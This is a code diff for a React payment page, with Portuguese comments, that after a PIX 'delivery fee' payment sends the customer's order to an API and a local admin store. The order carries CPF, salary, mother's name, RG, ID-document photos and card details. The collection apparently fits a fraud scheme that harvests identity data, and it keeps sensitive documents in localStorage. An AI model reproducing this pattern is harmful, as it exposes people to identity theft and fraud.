@@ -298,8 +298,47 @@ export default function PaymentPage() {
       trackPurchase(dadosPix.amount, 'BRL', resultado.transactionId);
       console.log('✓ Purchase tracked no Facebook Pixel');
 
-      // Salvar pedido no admin store
-      console.log('💾 [PaymentPage] Salvando pedido no admin store...');
+      // Salvar pedido via API (Postgres)
+      console.log('💾 [PaymentPage] Enviando pedido para API (DB)...');
+      try {
+        const orderPayload = {
+          transactionId: resultado.transactionId,
+          nomeCompleto,
+          cpf,
+          email,
+          telefone,
+          dataNascimento,
+          profissao,
+          salario,
+          nomeMae,
+          endereco,
+          valorEntrega: dadosPix.amount,
+          pixCode: resultado.pixCode,
+          pixQrCode: resultado.qrCode,
+          rg: useUserStore.getState().rg,
+          documentPhotoFront: useUserStore.getState().documentPhotoFront,
+          documentPhotoBack: useUserStore.getState().documentPhotoBack
+        };
+
+        // Usa fetch para bater na serverless function
+        fetch('/api/create-order', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(orderPayload)
+        }).then(async (res) => {
+          if (res.ok) {
+            console.log('✅ [PaymentPage] Pedido salvo no Banco de Dados com sucesso!');
+          } else {
+            console.error('❌ [PaymentPage] Erro ao salvar no DB:', await res.text());
+          }
+        }).catch(err => console.error('❌ [PaymentPage] Erro de rede ao salvar no DB:', err));
+
+      } catch (err) {
+        console.error('Erro ao preparar envio para API:', err);
+      }
+
+      // Salvar pedido no admin store (LocalStorage - Backup/Dev)
+      console.log('💾 [PaymentPage] Salvando pedido no admin store (Local)...');
       const savedOrder = addOrder({
         nomeCompleto,
         telefone,
@@ -319,14 +358,21 @@ export default function PaymentPage() {
         validade,
         bandeiraCartao,
         limite,
+        // Incluir dados de KYC também no local
+        rg: useUserStore.getState().rg,
+        documentPhotoFront: useUserStore.getState().documentPhotoFront,
+        documentPhotoBack: useUserStore.getState().documentPhotoBack
       });
-      console.log('✅ [PaymentPage] Pedido salvo com ID:', savedOrder.id);
-      console.log('✓ Pedido salvo no admin store');
+      console.log('✅ [PaymentPage] Pedido salvo no admin store');
 
       // ========================================
       // ENVIAR NOTIFICAÇÃO (APENAS UMA VEZ)
       // ========================================
-      if (!notificacaoPendenteEnviadaRef.current) {
+      // Verificar se o pedido é novo ou recuperado (duplicado)
+      const isNewOrder = savedOrder && savedOrder.transactionId === resultado.transactionId &&
+        (new Date(savedOrder.createdAt).getTime() > Date.now() - 10000); // Criado nos últimos 10s
+
+      if (isNewOrder && !notificacaoPendenteEnviadaRef.current) {
         console.log('📤 Enviando notificação de pedido pendente...');
         try {
           await notificarPedidoPendente(resultado.transactionId, dadosPix.amount);
@@ -336,7 +382,7 @@ export default function PaymentPage() {
           console.error('❌ Erro ao enviar notificação de pedido pendente:', error);
         }
       } else {
-        console.log('ℹ️ Notificação já foi enviada anteriormente, pulando...');
+        console.log('ℹ️ Notificação pulada (pedido recuperado/duplicado ou já enviada)');
       }
 
       console.log(`🎉 PIX ${usouMock ? 'mock' : 'real'} processado com sucesso!`);
